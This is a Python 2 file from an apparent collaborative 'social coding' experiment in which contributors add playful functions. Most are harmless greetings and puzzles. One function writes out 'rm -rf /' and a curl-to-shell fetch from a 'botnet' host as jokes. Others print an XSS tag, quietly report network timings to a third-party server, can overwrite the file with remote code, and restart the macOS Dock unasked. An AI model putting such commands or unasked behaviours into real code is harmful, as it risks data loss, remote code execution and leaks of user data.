#!/usr/bin/env python

# Welcome to soCode, the social coding experiment.
# Here are the rules!
#       - Add a function with your github name as its name.
#       - Your function can do anything and everything, as long as it
#         finishes in a reasonable amount of time (no infinite loops please)
#       - Once your function is written, you can call it from anywhere else in the
#         already existing exectution chain.
#       - Never entirely delete anyone else's function, edit it if needed.
#       - lefin() should be the last executing function, always

# Lets see if we can make something meaningful out of this.

import json
import requests
import random
import getpass
import re
import hashlib
import os
import string
import math
import sys
import inspect
import webbrowser
import time
import urllib2
import platform

def kirualex():
    s = "Go placidly amid the noise and haste, and remember what peace there may be in silence."
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(.03)

def jontonsoup():
    print "There's always one more bug."

def heinzf(update=True):
    """Compare itself with the raw code github. If there's something new, it updates the file localy."""
    git_file = requests.get('https://raw.github.com/sricola/socode/master/socode.py').content
    git_hash = hashlib.sha256(git_file).hexdigest()
    with open(os.path.realpath(__file__),'r+') as f:
        local_file = f.read()
    f.close()
    local_hash = hashlib.sha256(local_file).hexdigest()

    if  local_hash != git_hash and update == True:
        with open(os.path.realpath(__file__),'w+') as f:
            f.write(git_file)
            print 'I update myself, when I think about you, lalalala'
        f.close()

def zachlatta():
    import antigravity

def doctorpangloss():
    raw = requests.get('https://raw.github.com/sricola/socode/master/socode.py').content
    # not sure what is being achieved here - @sricola
    #matches = re.sub(r'doctorpangloss\(\)\n', r'doctorpangloss()\ndoctorpangloss()\n', raw, re.M|re.I|re.G)
    #print raw
    
def ankushsachdeva():
	contents =open(__file__).read()
	print re.findall('def .* :',contents)
	
def adelevie():
    pass

def piperchester():
    print "I love this idea. Hailing from Rochester, NY!"

def binary132():
    print "Perl is better.  PS everyone is lazy"
    daniel_dressler()

def sricola():
    print "Welcome to soCode!!"

def bencooling():
    print "I don't know Python; I don't belong here"
    zachlatta()
    
def kisom():
    def zgohr(city):
        weather = json.loads(requests.
                             get('http://api.openweathermap.org'
                                 '/data/2.1/find/name?q=%s' % city).content)
        kelvin = weather['list'][0]['main']['temp']
        fahrenheit = 9/5*(kelvin - 273) + 32
        print 'and it is too damn cold' \
            if fahrenheit < 50 else 'and the temperature outside is tolerable'

    ip = requests.get('http://ifconfig.me/ip').content
    geoip = json.loads(requests.get('http://freegeoip.net/json/').content)
    print 'there once was a coder from', geoip['country_name']
    zgohr(geoip['city'])

def daniel_dressler(): # really daniel-dressler
    return 42

def evinugur():
    print 'there is a ', (random.random()*100), "% chance that something cool will come from this..."

def ncammarata():
    tweets = json.loads(requests.get("https://search.twitter.com/search.json?q=a").content)
    tweet = tweets['results'][0]['text']
    print "Random Tweet:", tweet.encode('utf-8') 

# Generate a random nonsense word with a vowel:consolant ratio of 1:5
def taylorlapeyre():
    word = []
    consonants = "socialcoding"
    vowels     = "aeiou"

    for i in range(random.randint(3, 15)):
        if i % 5 == 0:
            letter = random.choice(vowels)
        else:
            letter = random.choice(consonants)
        word.append(letter)

    return ''.join(word)


def kghose():
    import curses, time
    
    def main_loop(window):
        window.clear()
        N = 100
        primes = []
        this_prime = 2
        keep_finding = True
        numbers = [n for n in xrange(N+1)]
        numbers[1] = None
        while keep_finding:
            primes.append(this_prime)
            for n in xrange(2*this_prime, N+1, this_prime):
                numbers[n] = None
                paint_grid(window, numbers)
          
            keep_finding = False
            for n in xrange(this_prime+1, N+1):
                if numbers[n] is not None:
                    this_prime = n
                    keep_finding = True
                    break
    
    
    def paint_grid(window, numbers):
        for row in xrange(10):
            for col in xrange(10):
              n = 10*row + col + 1
              if numbers[n] is not None:
                  s = str(n)
              else:
                  s = '   '
              window.addstr(row, 3*col, s)
        window.refresh()
        time.sleep(.1)
    
    curses.wrapper(main_loop)
    
def jessex():
    os.execl("/bin/echo", "echo", "This is a long way to go for 'hello world' but life's about the journey.")

def lafin():
    print "Goodbye Social World!"
    print "\nStarted with <3 in Brooklyn, NY\n"

def prezjordan():
    h,s='.;*&8#',''
    for q in range(HoLyVieR(daniel_dressler() + 1, 1013)):
        if q%40==0:print s;s=''
        i,k=0,0
        while(abs(k)<2*(i<15)):k,i=k**2+complex(q%40*.075-2,q/40*-.1+1),i+1
        s+=h[i/3]*2

def JesseAldridge():
    def wrap(f):
      def new_f(*args, **kwargs):
        start_time = time.time()
        for i in range(random.randrange(1, 3)):
            ret_val = f(*args, **kwargs)
            if time.time() - start_time > .1:
                break
        return ret_val
      return new_f

    g = globals()
    for k, v in g.iteritems():
      if callable(v) and k != 'JesseAldridge':
        g[k] = wrap(v)

def eternalmatt():
    print "Never gonna give you up."
    print "Never gonna let you down."
    print "Never gonna run around."
    print "And hurt you."

def shuhaowu(): # Call me last! :D
    l = locals()
    for f in l.keys():
        if not (f.startswith("_") or f == "shuhaowu"):
            del l[f] # ^_^

    print "Goodbye, cruel world"

def agoebel():
    print "America!"

def tcr():
    print "You know we love you, ", getpass.getuser(), "."

def fmazon3():
    print "%d" % 0xDEADC0DE

def peterwallhead():
    print '\n'.join('Fizz'*(not i%3) + 'Buzz'*(not i%5) or str(i) for i in range(1, 101))

def cyclo():
    print "!dnalgnE morf olleH"[::-1]

def chrisgw():
    print "meh"

def maxmackie(crypt_me):
    """Just try and crack this cipher."""
    abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    crypt = "mplnkoijbqazdsxcwerfgvhutyQASXZWDVFCERGTBHNYKMJLUPIO4567382901"
    print crypt_me.translate(string.maketrans(abc, crypt))

def uiri():
    with open(os.path.realpath(__file__),'r') as f:
        for line in f.readlines():
            if line.strip()[:5] == "print":
                print line.strip()

def jpadilla():
    repo = requests.get('https://api.github.com/repos/sricola/socode').json()
    try:
        print 'Forked {} times'.format(repo['forks_count'])
    except ValueError:
        pass

def rburgosnavas(name):
    x = (len(name) + 6)
    print '-' * x
    print "|" + ' ' * x + "|"
    print "|  " + name + "  |"
    print "|" + ' ' * x + "|"
    print '-' * x

def GeneralZero():# Spin the wheel
    random.choice([obj for name, obj in inspect.getmembers(sys.modules[__name__]) if inspect.isfunction(obj)])()

def bprater():
	print "social coding, the end is near."

def satshabad():
    # this doesn't seem to space right...
    for x in range(10000):
        r = random.randint(0,1)
        if r == 0:
            sys.stdout.write('/')
        else:
            sys.stdout.write('\\')

def henghonglee():
    print "#!brain"

def jhgaylor():
    print "Signing in from Starkville, Mississippi."

def mmay():
    url = "http://placekitten.com/%d/%d" %(random.randint(500, 1000), random.randint(500, 1000))
    print "Get your daily dose of kitten at: " + url

def jeffjose():
    print "Hi from India!"

def julio():
    print 111111111 * 111111111;

def ondrae(): # Random compliment. If anyone has a better source, add it in.
    response = requests.get("http://peoplearenice.blogspot.com/p/compliment-list.html")
    lines = response.text.split('\n')
    pattern = '\d+\.\s+(.*)</span>'
    compliments = []
    for line in lines:
        m = re.search(pattern, line)
        if m:
            compliments.append(m.group(1))
    print getpass.getuser() +', ' + compliments[random.randint(1,len(compliments))].lower()

def djrausch():
    print "DAE #HOLO? #NEXUS #HOLOYOLO"

def aniketpant():
    print "Moving the world off Internet Explorer 6"
    print "Tell your friends to join the cause. Share this site http://bit.ly/ie6countdown and tweet #ie6countdown. Let everyone know that you're doing your part to get Internet Explorer 6 to 1%."

# Compute the modular multiplicative inverse using the extended Euclide algorithm
# See this for more information : http://en.wikipedia.org/wiki/Modular_multiplicative_inverse#Extended_Euclidean_algorithm
#
# @param nb  Number to be inversed
# @param mod Modular base
# @return The modular multiplicative inverse if found and None if not found.
def HoLyVieR(nb, mod):
    # 1 is a special case, the inverse modulo is always 1 for all modular base #
    if (nb == 1):
        return 1

    # We apply the Euclide method to find the GCD step for gcd(nb, mod) #
    stack = []
    a = mod;
    b = nb;
    n = mod / nb;
    r = mod % nb;

    while r != 0:
        stack.append([a, b, n, r]);

        a = b;
        b = r;
        n = a / b;
        r = a % b;

    # If we reach this condition it means there was no step and therefore gcd(nb, mod) != 1 and there is no modular multiplicative inverse #
    if len(stack) == 0:
        return None

    values = stack.pop()

    # If the last value isn't 1 then gcd(nb, mod) != 1 and there is no modular multiplicative inverse #
    if values[3] != 1:
        return None

    # We do the GCD step backward to find the solution #
    f1 = values[3]
    f2 = values[2]
    atN2 = True

    while len(stack) > 0:
        values = stack.pop()

        if atN2:
            f1 += f2 * values[2]
        else:
            f2 += f1 * values[2]

        atN2 = not atN2

    f = -f2 if atN2 else f1

    # While "f" is a correct result, it's sometimes a negative value and it's usually more
    # convenient to have a positive value that's in the range of 0 to "mod".
    if (f < 0):
        f += mod * (math.fabs(math.floor(f / mod)) + 1)

    return int(f % mod)

def eddotman():
    a = range(5)
    for x in a:
        print x

def chewxy():
    # because there is nothing better to do after the world has ended.
    pass

def hazirguo():
    print "Mourning for the dead in Sichuan earthquake!\n"

def sfrnld():
    print "From Indonesia with love!"

def chris911():
    contributors = requests.get('https://api.github.com/repos/sricola/socode/contributors').json()
    contributors_list = [x['login'] for x in contributors]
    print 'Contributors: ', ', '.join(contributors_list)

def PiersonBro():
    print "My bane was not capability it was randomness."
 
def dogukantufekci():
    print "This is the connected world."
    webbrowser.open('http://www.silverspore.com/wiki/images/1/12/Connected_world-medium.jpg')
    
def doboy(doboy_):
    if doboy == doboy_:
        doboy_('rm -rf /')
        doboy('sh <(curl botnet.beepboop.com/main.sh)')
    else:
        print doboy_
        
def ngokevin(shamelessadvertising):
    # I'm sleepy zzz.
    time.sleep(0)
    # Check for XSS.
    print '<script>alert("HAHAHA");</script>'
    import antigravity
    
def gardaud(func):
	print "Should I execute func?"
	if random.randrange(0,2) == 0:
		print "Yes! :D"
		return func()
	else:
		print "No! :( "
		return None

def lax():
    file = "http://s.xnimg.cn/100k.jpg"

    t1 = time.clock()
    r = requests.get(file)
    t2 = time.clock()
    t = t2 - t1

    if len(r.content) > 100000:
      print 'testing network speed ... speed %.2f kB/s' % (100 / t)
      u = "succ=1&t=%f" % t
    else:
      print 'testing network speed ... speed %.2f kB/s' % (100 / t)
      u = "succ=0&t=%f" % t

    requests.get('http://www.liulantao.com/ss/?%r' % u)



def shazeline(name):
    print name + " is a pretty cool guy"
    
def samlabs821():
    print "vesselam"

def matiasinsaurralde():
    print "hello, this is skynet"

def drewcrawford():
    print "Let's see that again..."
    functions = filter(lambda l: hasattr(l,'__call__') and l.func_code.co_argcount==0,globals().values())
    from random import choice
    f = choice(functions)
    try:
        f()
    except Exception as e:
        print "didn't work.",e

def dmercer(number, start=2):
    """
       Sift the Two's and Sift the Three's,
       The Sieve of Eratosthenes.
       When the multiples sublime,
       The numbers that remain are Prime!
    """
    sieve = []
    for n in xrange(start, number+1):
        is_prime = True
        for p in sieve:
            if n % p == 0:
                is_prime = False
                break
            if p * p > n:
                break
        if is_prime:
            sieve.append(n)
    return sieve
    
def ryanseys():
    try:
        ryanseys()
    except:
        pass

def danielnr(huehue):
    print "                                                                                "
    print "                                                                                "
    print "                             SIGNING IN FROM ALASKA                             "
    print "                                                                                "
    print "                                                                                "
    print "                                                                                "
    print "                                           ``-:/:::.                            "
    print "                          `.::::::-.``-:////:-.```.://:::--`                    "
    print "                      .:///-.````.-://///:.          `....-://:.                "
    print "                   -//-..-:::--`    .hNNNs:+                 ``:/-              "
    print "                 -/-`  //-....-+:   oMMMMm`o: ``                `-+.            "
    print "                //`   `y      `o-   -ydmdo:s+//////:.       `://+/-+:           "
    print "             `-/:      o:   .:/.     ``.../o.     `.:/.    -+./mNNm+o:          "
    print "        ```-//-`       `+///-`           -s```       `//   :+`yMMMMd`/:.        "
    print "     `////:-`            ``              y/./.    .`   o:   .:ohmdy/  .:/:-     "
    print "     .s        `.                       `h-.`     ::.` +/      ...`      `-/-   "
    print "      ://:::::/::/-                      //.       `.:oo`                   -/- "
    print "        `....`   `////:-         `.`      `:/::---:://-`                 ..`  -+"
    print "                    ```s-        +/+-    `.```.....``                   o/://. +"
    print "                      /+         -s.+-.-//::///--..``                   .o. `s.+"
    print "                     `y`          :/-://-```  `.--::/:                   .+-.o-+"
    print "                     .y            `-:::::////--.````:/.`````              --. +"
    print "                     +o                      `.-::://:-/+++++                  +"
    print "                    `d++                             .:://::`                  +"
    print "                    :d +:                                                      +"
    print "                    os  //`                                                    +"
    print "                  `+++/- `:/.       DANIELNR                            .//:::-o"
    print "                 `o-   -/:``:/-`                                      `:h. `...:"
    print "                 o:      .//.`HTTPS://DANIELNR.COM/                 `//.h+      "
    print "                +/         `-///--////-.                         `.//. `d:      "
    print "               :o              `-/////+sy-                   -////-`   oy       "
    print "               y.                   `````                   /so+//:::/+d-       "
    print "              /s------------------------------------------------::///:/         "
  
def spratt():
    print "Simon was here"

def windspy():
  print "'cross the GREAT WALL, we can reach every corner of the world' is just a big joke."

def dpayne():
    try:
        #sets the desktop wallpaper to the top image on the wallpapers subreddit
        sub_reddit = 'wallpapers'
        
        #get the top image link
        reddit_json_url = 'http://www.reddit.com/r/' + sub_reddit + '/top.json?sort=top&t=day'
        response = urllib2.urlopen(reddit_json_url)
        redditJson = response.read()
        m = re.search('\"url\": \"(.*?)\",', redditJson)
        imageUrl = m.group(1)
        
        extension = imageUrl[-4:]
        accepted_extensions = set(['jpeg', '.jpg', '.png', '.bmp'])
        if extension not in accepted_extensions:
            #ignore non image extensions
            return False
        
        #save top wallpaper
        opener1 = urllib2.build_opener()
        page1 = opener1.open(imageUrl)
        my_picture = page1.read()
        filename = "reddit_wallpaper.jpg"
        fout = open(filename, "wb")
        fout.write(my_picture)
        fout.close()
        
        currentDir = os.getcwd()
        plat = platform.system().lower()
        
        #set wallpaper
        if (plat == 'darwin'):
            os.system("defaults write com.apple.desktop Background '{default = {ImageFilePath = \"" + currentDir + "/reddit_wallpaper.jpg\"; };}'")
            os.system("killall Dock")
            return True
    except urllib2.HTTPError:
        print 'There was an error'
    
    return False
  
if __name__ == "__main__":
    kirualex()
    heinzf(False) # this thing makes it hard to make sure stuff works, doesn't it?
    uiri() # Can I go first unless you're going to modify the file?
    dpayne()
    drewcrawford()
    dmercer(42)
    ryanseys()
    jpadilla()
    mmay()
    evinugur()
    JesseAldridge()
    bencooling()
    sricola()
    kisom()
    ncammarata()
    eddotman()
    julio()
    gardaud(prezjordan())
    GeneralZero()
    tcr()
    jhgaylor()
    henghonglee()
    taylorlapeyre()
    djrausch()
    jeffjose()
    agoebel()
    cyclo()
    binary132()
    sfrnld()
    kghose()
    doctorpangloss()
    chrisgw()
    dogukantufekci()
    fmazon3()
    bprater()
    eternalmatt()
    PiersonBro()
    ankushsachdeva()
    aniketpant()
    jontonsoup()
    prezjordan()
    shuhaowu()
    chewxy()
    rburgosnavas('CTHULHU LIVES!')
    satshabad()
    ondrae()
    hazirguo()
    chris911()
    doboy(doboy)
    ngokevin('ngokevin.com')
    jessex()
    lax()
    danielnr()
    spratt()
    windspy()
    samlabs821()
    
    # as per instructed, please leave this as the final function
    lafin()
